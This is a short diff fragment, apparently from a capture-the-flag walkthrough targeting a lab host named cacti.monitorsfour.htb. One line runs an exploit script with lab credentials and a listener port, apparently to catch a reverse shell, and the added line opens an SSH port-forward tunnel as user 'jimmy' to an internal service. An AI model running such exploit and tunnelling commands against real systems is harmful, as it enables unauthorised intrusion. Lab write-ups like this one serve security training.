@@ -3,7 +3,7 @@ python3 exploit.py -u marcus -p wonderful1 -i 10.10.17.59 -l 4444 -url http://ca
 ```
 
 ```
-
+ssh jimmy@cacti.monitorsfour.htb -L 8080:localhost:8080
 ```
 
 ```
